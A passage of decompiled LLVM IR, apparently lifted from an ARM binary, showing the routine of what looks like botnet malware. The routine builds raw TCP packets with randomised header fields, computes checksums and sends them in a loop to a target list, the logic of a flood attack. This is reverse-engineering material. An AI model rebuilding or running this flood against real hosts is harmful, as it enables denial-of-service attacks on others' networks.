  %v4_a848 = inttoptr i32 %v3_a848 to i8*
  store i8 %v1_a848, i8* %v4_a848, align 1
  %v0_a850 = load i32, i32* %r1.global-to-local, align 4
  %v2_a850 = icmp eq i32 %v0_a850, 0
  store i1 %v2_a850, i1* %cpsr_z.global-to-local, align 1
  %v2_a854 = load i32, i32* %r4.global-to-local, align 4
  %v3_a854 = add i32 %v2_a854, 4
  %v4_a854 = inttoptr i32 %v3_a854 to i16*
  store i16 %rev, i16* %v4_a854, align 2
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_a85c = load i32, i32* %r4.global-to-local, align 4
  %v3_a85c = add i32 %v2_a85c, 9
  %v4_a85c = inttoptr i32 %v3_a85c to i8*
  store i8 6, i8* %v4_a85c, align 1
  %v0_a860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a860, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a7f4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a864 = load i32, i32* %r4.global-to-local, align 4
  %v4_a864 = add i32 %v3_a864, 6
  %v5_a864 = inttoptr i32 %v4_a864 to i16*
  store i16 64, i16* %v5_a864, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a7f4, %bb
  store i32 %v6_a6c4, i32* %r3.global-to-local, align 4
  %v1_a86c = load i32, i32* %r4.global-to-local, align 4
  %v2_a86c = add i32 %v1_a86c, 12
  %v3_a86c = inttoptr i32 %v2_a86c to i32*
  store i32 %v6_a6c4, i32* %v3_a86c, align 4
  %v0_a870 = load i32, i32* %r0.global-to-local, align 4
  %v1_a870 = add i32 %v0_a870, 16
  %v2_a870 = inttoptr i32 %v1_a870 to i32*
  %v3_a870 = load i32, i32* %v2_a870, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  store i32 %v4_a874, i32* %r0.global-to-local, align 4
  %v2_a87c = load i32, i32* %r4.global-to-local, align 4
  %v3_a87c = add i32 %v2_a87c, 2
  %v4_a87c = inttoptr i32 %v3_a87c to i16*
  store i16 15360, i16* %v4_a87c, align 2
  %v0_a880 = load i32, i32* %r3.global-to-local, align 4
  %v1_a880 = load i32, i32* %r4.global-to-local, align 4
  %v2_a880 = add i32 %v1_a880, 16
  %v3_a880 = inttoptr i32 %v2_a880 to i32*
  store i32 %v0_a880, i32* %v3_a880, align 4
  %v0_a884 = load i32, i32* %r0.global-to-local, align 4
  %v1_a884 = trunc i32 %v0_a884 to i16
  %v2_a884 = load i32, i32* %r4.global-to-local, align 4
  %v3_a884 = add i32 %v2_a884, 20
  %v4_a884 = inttoptr i32 %v3_a884 to i16*
  store i16 %v1_a884, i16* %v4_a884, align 2
  %v0_a888 = load i32, i32* %r4.global-to-local, align 4
  %v1_a888 = add i32 %v0_a888, 20
  store i32 %v1_a888, i32* %r1.global-to-local, align 4
  %v1_a88c = add i32 %v0_a888, 32
  %v2_a88c = inttoptr i32 %v1_a88c to i8*
  %v3_a88c = load i8, i8* %v2_a88c, align 1
  %v4_a88c = zext i8 %v3_a88c to i32
  store i32 %v4_a88c, i32* %r3.global-to-local, align 4
  %v1_a890 = add i32 %v0_a888, 33
  %v2_a890 = inttoptr i32 %v1_a890 to i8*
  %v3_a890 = load i8, i8* %v2_a890, align 1
  %v4_a890 = zext i8 %v3_a890 to i32
  store i32 %v1_a79c, i32* %r0.global-to-local, align 4
  %v1_a898 = urem i8 %v3_a88c, 16
  %v1_a89c = or i8 %v1_a898, -96
  %v1_a8a0 = and i32 %v4_a890, 223
  store i32 %v1_a8a0, i32* %r2.global-to-local, align 4
  store i8 %v1_a89c, i8* %v2_a88c, align 1
  %v0_a8a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8a8 = load i32, i32* %r0.global-to-local, align 4
  %v4_a8a8 = mul i32 %v1_a8a8, 32
  %v5_a8a8 = or i32 %v4_a8a8, %v0_a8a8
  store i32 %v5_a8a8, i32* %r2.global-to-local, align 4
  store i32 %v5_a7a8, i32* %r0.global-to-local, align 4
  store i32 %v6_a8b0, i32* %r3.global-to-local, align 4
  %v1_a8b4 = trunc i32 %v5_a8a8 to i8
  %v2_a8b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8b4 = add i32 %v2_a8b4, 13
  %v4_a8b4 = inttoptr i32 %v3_a8b4 to i8*
  store i8 %v1_a8b4, i8* %v4_a8b4, align 1
  %v0_a8b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8b8 = trunc i32 %v0_a8b8 to i16
  %v2_a8b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8b8 = add i32 %v2_a8b8, 2
  %v4_a8b8 = inttoptr i32 %v3_a8b8 to i16*
  store i16 %v1_a8b8, i16* %v4_a8b8, align 2
  %v0_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v1_a8bc = add i32 %v0_a8bc, 13
  %v2_a8bc = inttoptr i32 %v1_a8bc to i8*
  %v3_a8bc = load i8, i8* %v2_a8bc, align 1
  %v4_a8bc = zext i8 %v3_a8bc to i32
  store i32 %v1_a7bc, i32* %r2.global-to-local, align 4
  %v1_a8c4 = and i32 %v4_a8bc, 239
  %v5_a8c8 = or i32 %v1_a8c4, %v4_a8c8
  store i32 %v5_a8c8, i32* %r3.global-to-local, align 4
  %v0_a8cc = load i32, i32* %r0.global-to-local, align 4
  %v2_a8cc = add i32 %v0_a8bc, 4
  %v3_a8cc = inttoptr i32 %v2_a8cc to i32*
  store i32 %v0_a8cc, i32* %v3_a8cc, align 4
  %v0_a8d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8d0 = trunc i32 %v0_a8d0 to i8
  %v2_a8d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8d0 = add i32 %v2_a8d0, 13
  %v4_a8d0 = inttoptr i32 %v3_a8d0 to i8*
  store i8 %v1_a8d0, i8* %v4_a8d0, align 1
  %v0_a8d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8d4 = add i32 %v0_a8d4, 13
  %v2_a8d4 = inttoptr i32 %v1_a8d4 to i8*
  %v3_a8d4 = load i8, i8* %v2_a8d4, align 1
  %v4_a8d4 = zext i8 %v3_a8d4 to i32
  store i32 %v1_a7c0, i32* %r3.global-to-local, align 4
  %v1_a8dc = and i32 %v4_a8d4, 247
  %v5_a8e0 = or i32 %v1_a8dc, %v4_a8e0
  store i32 %v5_a8e0, i32* %r2.global-to-local, align 4
  %v1_a8e4 = trunc i32 %v5_a8e0 to i8
  store i8 %v1_a8e4, i8* %v2_a8d4, align 1
  %v0_a8e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8e8 = add i32 %v0_a8e8, 13
  %v2_a8e8 = inttoptr i32 %v1_a8e8 to i8*
  %v3_a8e8 = load i8, i8* %v2_a8e8, align 1
  %v4_a8e8 = zext i8 %v3_a8e8 to i32
  store i32 %v1_a7c4, i32* %r0.global-to-local, align 4
  %v1_a8f0 = and i32 %v4_a8e8, 251
  %v5_a8f4 = or i32 %v1_a8f0, %v4_a8f4
  store i32 %v5_a8f4, i32* %r3.global-to-local, align 4
  %v1_a8f8 = trunc i32 %v5_a8f4 to i8
  store i8 %v1_a8f8, i8* %v2_a8e8, align 1
  %v0_a8fc = load i32, i32* %r1.global-to-local, align 4
  %v1_a8fc = add i32 %v0_a8fc, 13
  %v2_a8fc = inttoptr i32 %v1_a8fc to i8*
  %v3_a8fc = load i8, i8* %v2_a8fc, align 1
  %v4_a8fc = zext i8 %v3_a8fc to i32
  store i32 %v1_a7c8, i32* %r3.global-to-local, align 4
  %v1_a904 = and i32 %v4_a8fc, 253
  %v4_a908 = or i32 %v1_a904, %v3_a908
  store i32 %v4_a908, i32* %r2.global-to-local, align 4
  %v1_a90c = trunc i32 %v4_a908 to i8
  store i8 %v1_a90c, i8* %v2_a8fc, align 1
  %v0_a910 = load i32, i32* %r1.global-to-local, align 4
  %v1_a910 = add i32 %v0_a910, 13
  %v2_a910 = inttoptr i32 %v1_a910 to i8*
  %v3_a910 = load i8, i8* %v2_a910, align 1
  %v4_a910 = zext i8 %v3_a910 to i32
  store i32 %v1_a7cc, i32* %r0.global-to-local, align 4
  %v1_a918 = and i32 %v4_a910, 254
  %v2_a91c = or i32 %v1_a918, %v1_a7cc
  store i32 %v2_a91c, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 4, i32* @r6, align 4
  %v1_a928 = trunc i32 %v2_a91c to i8
  store i8 %v1_a928, i8* %v2_a910, align 1
  %v0_a92c = load i32, i32* @r5, align 4
  %v1_a92c = trunc i32 %v0_a92c to i8
  %v2_a92c = load i32, i32* %r4.global-to-local, align 4
  %v3_a92c = add i32 %v2_a92c, 40
  %v4_a92c = inttoptr i32 %v3_a92c to i8*
  store i8 %v1_a92c, i8* %v4_a92c, align 1
  %v0_a930 = load i32, i32* @r6, align 4
  %v1_a930 = trunc i32 %v0_a930 to i8
  %v2_a930 = load i32, i32* %r4.global-to-local, align 4
  %v3_a930 = add i32 %v2_a930, 41
  %v4_a930 = inttoptr i32 %v3_a930 to i8*
  store i8 %v1_a930, i8* %v4_a930, align 1
  %v0_a934 = call i32 @rand_next()
  %v1_a938 = urem i32 %v0_a934, 16
  %v1_a93c = or i32 %v1_a938, 1392
  %v1_a940 = add nuw nsw i32 %v1_a93c, 8
  %v3_a944 = mul nuw nsw i32 %v1_a940, 65536
  store i32 %v3_a944, i32* %r0.global-to-local, align 4
  %v3_a948 = mul nuw nsw i32 %v1_a940, 256
  %v1_a94c = and i32 %v3_a948, ptrtoint (i32* @global_var_ff00.28 to i32)
  %v5_a950 = or i32 %v1_a94c, 5
  %v1_a954 = trunc i32 %v5_a950 to i16
  %v2_a954 = load i32, i32* %r4.global-to-local, align 4
  %v3_a954 = add i32 %v2_a954, 42
  %v4_a954 = inttoptr i32 %v3_a954 to i16*
  store i16 %v1_a954, i16* %v4_a954, align 2
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_a960 = load i32, i32* %r4.global-to-local, align 4
  %v3_a960 = add i32 %v2_a960, 46
  %v4_a960 = inttoptr i32 %v3_a960 to i8*
  store i8 8, i8* %v4_a960, align 1
  %v0_a964 = load i32, i32* %r2.global-to-local, align 4
  %v1_a964 = trunc i32 %v0_a964 to i8
  %v2_a964 = load i32, i32* %r4.global-to-local, align 4
  %v3_a964 = add i32 %v2_a964, 47
  %v4_a964 = inttoptr i32 %v3_a964 to i8*
  store i8 %v1_a964, i8* %v4_a964, align 1
  %v0_a968 = load i32, i32* @r6, align 4
  %v1_a968 = trunc i32 %v0_a968 to i8
  %v2_a968 = load i32, i32* %r4.global-to-local, align 4
  %v3_a968 = add i32 %v2_a968, 44
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v1_a968, i8* %v4_a968, align 1
  %v0_a96c = load i32, i32* @r5, align 4
  %v1_a96c = trunc i32 %v0_a96c to i8
  %v2_a96c = load i32, i32* %r4.global-to-local, align 4
  %v3_a96c = add i32 %v2_a96c, 45
  %v4_a96c = inttoptr i32 %v3_a96c to i8*
  store i8 %v1_a96c, i8* %v4_a96c, align 1
  %v0_a970 = call i32 @rand_next()
  store i32 %v0_a970, i32* %r0.global-to-local, align 4
  %v2_a978 = load i32, i32* %r4.global-to-local, align 4
  %v3_a978 = add i32 %v2_a978, 59
  %v4_a978 = inttoptr i32 %v3_a978 to i8*
  store i8 6, i8* %v4_a978, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_a988 = load i32, i32* %r4.global-to-local, align 4
  %v2_a988 = add i32 %v1_a988, 48
  %v3_a988 = inttoptr i32 %v2_a988 to i32*
  store i32 %v0_a970, i32* %v3_a988, align 4
  %v0_a98c = load i32, i32* %r3.global-to-local, align 4
  %v1_a98c = load i32, i32* %r4.global-to-local, align 4
  %v2_a98c = add i32 %v1_a98c, 52
  %v3_a98c = inttoptr i32 %v2_a98c to i32*
  store i32 %v0_a98c, i32* %v3_a98c, align 4
  %v0_a990 = load i32, i32* %r2.global-to-local, align 4
  %v1_a990 = trunc i32 %v0_a990 to i8
  %v2_a990 = load i32, i32* %r4.global-to-local, align 4
  %v3_a990 = add i32 %v2_a990, 56
  %v4_a990 = inttoptr i32 %v3_a990 to i8*
  store i8 %v1_a990, i8* %v4_a990, align 1
  %v0_a994 = load i32, i32* %r1.global-to-local, align 4
  %v1_a994 = trunc i32 %v0_a994 to i8
  %v2_a994 = load i32, i32* %r4.global-to-local, align 4
  %v3_a994 = add i32 %v2_a994, 58
  %v4_a994 = inttoptr i32 %v3_a994 to i8*
  store i8 %v1_a994, i8* %v4_a994, align 1
  %v0_a998 = load i32, i32* %r1.global-to-local, align 4
  %v1_a998 = trunc i32 %v0_a998 to i8
  %v2_a998 = load i32, i32* %r4.global-to-local, align 4
  %v3_a998 = add i32 %v2_a998, 57
  %v4_a998 = inttoptr i32 %v3_a998 to i8*
  store i8 %v1_a998, i8* %v4_a998, align 1
  %v3_a99c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a99c, i32* %r3.global-to-local, align 4
  %v1_a9a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a9a0 = add i32 %v1_a9a0, %v3_a99c
  store i32 %v2_a9a0, i32* @r4, align 4
  %v1_a9a4 = load i32, i32* @sb, align 4
  %v9_a9a4 = icmp eq i32 %v2_a9a0, %v1_a9a4
  store i1 %v9_a9a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a9a0, i32* %stack_var_-44, align 4
  %v5_a9ac = icmp slt i32 %v2_a9a0, %v1_a9a4
  br i1 %v5_a9ac, label %dec_label_pc_a7f4, label %dec_label_pc_a9b0.preheader

dec_label_pc_a9b0.preheader:                      ; preds = %.thread, %dec_label_pc_a720
  %v0_a9b410 = phi i32 [ 0, %dec_label_pc_a720 ], [ %v1_a9a4, %.thread ]
  %v2_a9cc = icmp eq i32 %v6_a6c4, -1
  %v7_a9cc = icmp eq i32 %v6_a6c4, -1
  %v3_a9e0 = icmp eq i32 %v3_a740, 65535
  br label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_abac.dec_label_pc_a9b0_crit_edge, %dec_label_pc_a9b0.preheader
  %v0_a9b4 = phi i32 [ %v0_a9b4.pre, %dec_label_pc_abac.dec_label_pc_a9b0_crit_edge ], [ %v0_a9b410, %dec_label_pc_a9b0.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9b4, label %dec_label_pc_abac, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aaa4

dec_label_pc_a9c8:                                ; preds = %dec_label_pc_aaa4
  store i32 %v6_a6c4, i32* %r3.global-to-local, align 4
  store i1 %v7_a9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9cc, label %dec_label_pc_ab24, label %dec_label_pc_a9d4

dec_label_pc_a9d4:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_a9c8
  store i32 %v3_a740, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_a9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9e0, label %dec_label_pc_ab40, label %dec_label_pc_a9e8

dec_label_pc_a9e8:                                ; preds = %dec_label_pc_ab24, %dec_label_pc_a9d4
  %v1_a9ec = phi i32 [ %v1_ab34, %dec_label_pc_ab24 ], [ 65535, %dec_label_pc_a9d4 ]
  store i32 %v3_a744, i32* %r1.global-to-local, align 4
  %v9_a9ec = icmp eq i32 %v3_a744, %v1_a9ec
  store i1 %v9_a9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9ec, label %dec_label_pc_ab54, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_ab40.dec_label_pc_a9f4_crit_edge, %dec_label_pc_a9e8
  %v1_a9f8 = phi i32 [ %v1_a9f8.pre, %dec_label_pc_ab40.dec_label_pc_a9f4_crit_edge ], [ %v1_a9ec, %dec_label_pc_a9e8 ]
  store i32 %v3_a748, i32* %r2.global-to-local, align 4
  %v9_a9f8 = icmp eq i32 %v3_a748, %v1_a9f8
  store i1 %v9_a9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9f8, label %dec_label_pc_ab68, label %dec_label_pc_aa00

dec_label_pc_aa00:                                ; preds = %dec_label_pc_ab54.dec_label_pc_aa00_crit_edge, %dec_label_pc_a9f4
  %v1_aa04 = phi i32 [ %v1_aa04.pre, %dec_label_pc_ab54.dec_label_pc_aa00_crit_edge ], [ %v1_a9f8, %dec_label_pc_a9f4 ]
  store i32 %v6_a600, i32* %r3.global-to-local, align 4
  %v9_aa04 = icmp eq i32 %v6_a600, %v1_aa04
  store i1 %v9_aa04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa04, label %dec_label_pc_ab7c, label %dec_label_pc_aa0c

dec_label_pc_aa0c:                                ; preds = %dec_label_pc_ab68.dec_label_pc_aa0c_crit_edge, %dec_label_pc_aa00
  %v1_aa10 = phi i32 [ %v1_aa10.pre, %dec_label_pc_ab68.dec_label_pc_aa0c_crit_edge ], [ %v1_aa04, %dec_label_pc_aa00 ]
  store i32 %v6_a618, i32* %r0.global-to-local, align 4
  %v9_aa10 = icmp eq i32 %v6_a618, %v1_aa10
  store i1 %v9_aa10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa10, label %dec_label_pc_ab90, label %dec_label_pc_aa18

dec_label_pc_aa18:                                ; preds = %dec_label_pc_ab7c, %dec_label_pc_aa0c
  %v0_aa18 = load i32, i32* @fp, align 4
  %v2_aa18 = icmp eq i32 %v0_aa18, 0
  store i1 %v2_aa18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aa18, label %dec_label_pc_aa20, label %dec_label_pc_aba0

dec_label_pc_aa20:                                ; preds = %dec_label_pc_aa18, %dec_label_pc_ab90, %dec_label_pc_aba0
  %v2_aa24 = load i32, i32* @r5, align 4
  %v3_aa24 = add i32 %v2_aa24, 10
  %v4_aa24 = inttoptr i32 %v3_aa24 to i16*
  store i16 0, i16* %v4_aa24, align 2
  %v0_aa28 = load i32, i32* @r5, align 4
  store i32 %v0_aa28, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_aa30 = call i32 @checksum_generic(i32 %v0_aa28, i32 20)
  %v3_aa30 = trunc i32 %v2_aa30 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_aa38 = load i32, i32* @r5, align 4
  %v4_aa38 = add i32 %v3_aa38, 10
  %v5_aa38 = inttoptr i32 %v4_aa38 to i16*
  store i16 %v3_aa30, i16* %v5_aa38, align 2
  %v0_aa3c = load i32, i32* @r6, align 4
  store i32 %v0_aa3c, i32* @r1, align 4
  %v0_aa40 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa40 = trunc i32 %v0_aa40 to i16
  %v3_aa40 = add i32 %v0_aa3c, 16
  %v4_aa40 = inttoptr i32 %v3_aa40 to i16*
  store i16 %v1_aa40, i16* %v4_aa40, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_aa4c = load i32, i32* @r5, align 4
  store i32 %v0_aa4c, i32* %r0.global-to-local, align 4
  %v4_aa50 = call i32 @checksum_tcpudp(i32 %v0_aa4c, i32 %v0_aa3c, i32 10240, i32 40)
  %v5_aa50 = trunc i32 %v4_aa50 to i16
  store i32 %v4_aa50, i32* %r0.global-to-local, align 4
  %v3_aa54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa54, i32* %r3.global-to-local, align 4
  %v3_aa58 = mul i32 %v3_aa54, 32
  store i32 %v3_aa58, i32* %lr.global-to-local, align 4
  %v3_aa5c = load i32, i32* @r6, align 4
  %v4_aa5c = add i32 %v3_aa5c, 16
  %v5_aa5c = inttoptr i32 %v4_aa5c to i16*
  store i16 %v5_aa50, i16* %v5_aa5c, align 2
  %v0_aa60 = load i32, i32* %lr.global-to-local, align 4
  %v1_aa60 = load i32, i32* %r3.global-to-local, align 4
  %tmp70 = mul i32 %v1_aa60, -8
  %v5_aa60 = add i32 %v0_aa60, %tmp70
  store i32 %v5_aa60, i32* %lr.global-to-local, align 4
  %v0_aa64 = load i32, i32* @r6, align 4
  %v1_aa64 = add i32 %v0_aa64, 2
  %v2_aa64 = inttoptr i32 %v1_aa64 to i16*
  %v3_aa64 = load i16, i16* %v2_aa64, align 2
  %v4_aa64 = zext i16 %v3_aa64 to i32
  store i32 %v4_aa64, i32* @r6, align 4
  %v1_aa68 = load i32, i32* @r7, align 4
  %v2_aa68 = add i32 %v1_aa68, %v5_aa60
  store i32 %v2_aa68, i32* @lr, align 4
  %v3_aa6c = add i32 %v2_aa68, 2
  %v4_aa6c = inttoptr i32 %v3_aa6c to i16*
  store i16 %v3_aa64, i16* %v4_aa6c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_aa78 = load i32, i32* @r5, align 4
  store i32 %v0_aa78, i32* %r1.global-to-local, align 4
  %v0_aa7c = load i32, i32* @r8, align 4
  store i32 %v0_aa7c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_aa84 = load i32, i32* @lr, align 4
  %v6_aa8c = call i32 @__libc_sendto(i32 %v0_aa7c, i32 %v0_aa78, i32 60, i32 16384, i32 %v0_aa84, i32 16)
  %v3_aa90 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa90, i32* %r3.global-to-local, align 4
  %v1_aa94 = add i32 %v3_aa90, 1
  store i32 %v1_aa94, i32* %r0.global-to-local, align 4
  %v1_aa98 = load i32, i32* @sb, align 4
  %v9_aa98 = icmp eq i32 %v1_aa94, %v1_aa98
  store i1 %v9_aa98, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa94, i32* %stack_var_-44, align 4
  %v6_aaa0 = icmp slt i32 %v1_aa94, %v1_aa98
  br i1 %v6_aaa0, label %dec_label_pc_aaa4, label %dec_label_pc_abac

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_aa20, %dec_label_pc_a9c0
  %v1_aab4 = phi i32 [ %v1_aa94, %dec_label_pc_aa20 ], [ 0, %dec_label_pc_a9c0 ]
  %v5_aaa8 = mul i32 %v1_aab4, 24
  %v1_aaac = load i32, i32* @r7, align 4
  %v2_aaac = add i32 %v1_aaac, %v5_aaa8
  store i32 %v2_aaac, i32* %r3.global-to-local, align 4
  %v1_aab0 = add i32 %v2_aaac, 20
  %v2_aab0 = inttoptr i32 %v1_aab0 to i8*
  %v3_aab0 = load i8, i8* %v2_aab0, align 1
  %v4_aab0 = zext i8 %v3_aab0 to i32
  store i32 %v4_aab0, i32* %r2.global-to-local, align 4
  %v0_aab4 = load i32, i32* @sl, align 4
  %v4_aab4 = mul i32 %v1_aab4, 4
  %v5_aab4 = add i32 %v0_aab4, %v4_aab4
  %v6_aab4 = inttoptr i32 %v5_aab4 to i32*
  %v7_aab4 = load i32, i32* %v6_aab4, align 4
  store i32 %v7_aab4, i32* @r5, align 4
  %v2_aab8 = icmp ugt i8 %v3_aab0, 30
  %v7_aab8 = icmp eq i8 %v3_aab0, 31
  store i1 %v7_aab8, i1* %cpsr_z.global-to-local, align 1
  %v1_aabc = add i32 %v7_aab4, 20
  store i32 %v1_aabc, i32* @r6, align 4
  %v2_aac0 = xor i1 %v7_aab8, true
  %v3_aac0 = and i1 %v2_aab8, %v2_aac0
  br i1 %v3_aac0, label %dec_label_pc_a9c8, label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %dec_label_pc_aaa4
  %v1_aac4 = add i32 %v2_aaac, 16
  %v2_aac4 = inttoptr i32 %v1_aac4 to i32*
  %v3_aac4 = load i32, i32* %v2_aac4, align 4
  store i32 %v3_aac4, i32* %r4.global-to-local, align 4
  %v0_aac8 = call i32 @rand_next()
  store i32 %v0_aac8, i32* %r0.global-to-local, align 4
  %v3_aacc = load i32, i32* %stack_var_-44, align 4
  %v5_aad4 = mul i32 %v3_aacc, 24
  %v0_aad8 = load i32, i32* %r4.global-to-local, align 4
  %v1_aad8 = and i32 %v0_aad8, 16711680
  %v3_aadc = udiv i32 %v0_aad8, 16777216
  %v4_aae0 = udiv i32 %v1_aad8, 256
  %v5_aae0 = or i32 %v4_aae0, %v3_aadc
  store i32 %v5_aae0, i32* %r2.global-to-local, align 4
  %v1_aae4 = load i32, i32* @r7, align 4
  %v2_aae4 = add i32 %v1_aae4, %v5_aad4
  store i32 %v2_aae4, i32* %r1.global-to-local, align 4
  %v1_aae8 = and i32 %v0_aad8, ptrtoint (i32* @global_var_ff00.28 to i32)
  store i32 %v1_aae8, i32* %r3.global-to-local, align 4
  %v1_aaec = add i32 %v2_aae4, 20
  %v2_aaec = inttoptr i32 %v1_aaec to i8*
  %v3_aaec = load i8, i8* %v2_aaec, align 1
  %v4_aaec = zext i8 %v3_aaec to i32
  %v4_aaf0 = mul i32 %v1_aae8, 256
  %v4_aaf4 = mul i32 %v0_aad8, 16777216
  %v5_aaf0 = or i32 %v4_aaf0, %v4_aaf4
  %v5_aaf4 = or i32 %v5_aaf0, %v5_aae0
  %v7_aaf8 = lshr i32 %v0_aac8, %v4_aaec
  %v8_aaf8 = add i32 %v7_aaf8, %v5_aaf4
  store i32 %v8_aaf8, i32* %r2.global-to-local, align 4
  %v1_aafc = and i32 %v8_aaf8, 16711680
  store i32 %v1_aafc, i32* %r0.global-to-local, align 4
  %v1_ab08 = and i32 %v8_aaf8, 65280
  store i32 %v1_ab08, i32* %r1.global-to-local, align 4
  %v5_ab10 = call i32 @llvm.bswap.i32(i32 %v8_aaf8)
  %v1_ab14 = load i32, i32* @r5, align 4
  %v2_ab14 = add i32 %v1_ab14, 16
  %v3_ab14 = inttoptr i32 %v2_ab14 to i32*
  store i32 %v5_ab10, i32* %v3_ab14, align 4
  store i32 %v6_a6c4, i32* %r3.global-to-local, align 4
  store i1 %v7_a9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a9cc, label %dec_label_pc_ab24, label %dec_label_pc_a9d4

dec_label_pc_ab24:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_a9c8
  %v0_ab24 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_ab2c = load i32, i32* @r5, align 4
  %v2_ab2c = add i32 %v1_ab2c, 12
  %v3_ab2c = inttoptr i32 %v2_ab2c to i32*
  store i32 %v0_ab24, i32* %v3_ab2c, align 4
  store i32 %v3_a740, i32* %r0.global-to-local, align 4
  %v0_ab34 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab34 = add i32 %v0_ab34, -1
  store i32 %v1_ab34, i32* @r4, align 4
  %v9_ab38 = icmp eq i32 %v3_a740, %v1_ab34
  store i1 %v9_ab38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ab38, label %dec_label_pc_ab40, label %dec_label_pc_a9e8

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab24, %dec_label_pc_a9d4
  %v0_ab40 = call i32 @rand_next()
  %v1_ab40 = trunc i32 %v0_ab40 to i16
  store i32 %v0_ab40, i32* %r0.global-to-local, align 4
  store i32 %v3_a744, i32* %r1.global-to-local, align 4
  %v1_ab48 = load i32, i32* @r4, align 4
  %v9_ab48 = icmp eq i32 %v3_a744, %v1_ab48
  store i1 %v9_ab48, i1* %cpsr_z.global-to-local, align 1
  %v3_ab4c = load i32, i32* @r5, align 4
  %v4_ab4c = add i32 %v3_ab4c, 4
  %v5_ab4c = inttoptr i32 %v4_ab4c to i16*
  store i16 %v1_ab40, i16* %v5_ab4c, align 2
  br i1 %v9_ab48, label %dec_label_pc_ab54, label %dec_label_pc_ab40.dec_label_pc_a9f4_crit_edge

dec_label_pc_ab40.dec_label_pc_a9f4_crit_edge:    ; preds = %dec_label_pc_ab40
  %v1_a9f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a9f4

dec_label_pc_ab54:                                ; preds = %dec_label_pc_ab40, %dec_label_pc_a9e8
  %v0_ab54 = call i32 @rand_next()
  %v1_ab54 = trunc i32 %v0_ab54 to i16
  store i32 %v0_ab54, i32* %r0.global-to-local, align 4
  store i32 %v3_a748, i32* %r2.global-to-local, align 4
  %v1_ab5c = load i32, i32* @r4, align 4
  %v9_ab5c = icmp eq i32 %v3_a748, %v1_ab5c
  store i1 %v9_ab5c, i1* %cpsr_z.global-to-local, align 1
  %v3_ab60 = load i32, i32* @r5, align 4
  %v4_ab60 = add i32 %v3_ab60, 20
  %v5_ab60 = inttoptr i32 %v4_ab60 to i16*
  store i16 %v1_ab54, i16* %v5_ab60, align 2
  br i1 %v9_ab5c, label %dec_label_pc_ab68, label %dec_label_pc_ab54.dec_label_pc_aa00_crit_edge

dec_label_pc_ab54.dec_label_pc_aa00_crit_edge:    ; preds = %dec_label_pc_ab54
  %v1_aa04.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aa00

dec_label_pc_ab68:                                ; preds = %dec_label_pc_ab54, %dec_label_pc_a9f4
  %v0_ab68 = call i32 @rand_next()
  %v1_ab68 = trunc i32 %v0_ab68 to i16
  store i32 %v0_ab68, i32* %r0.global-to-local, align 4
  store i32 %v6_a600, i32* %r3.global-to-local, align 4
  %v1_ab70 = load i32, i32* @r4, align 4
  %v9_ab70 = icmp eq i32 %v6_a600, %v1_ab70
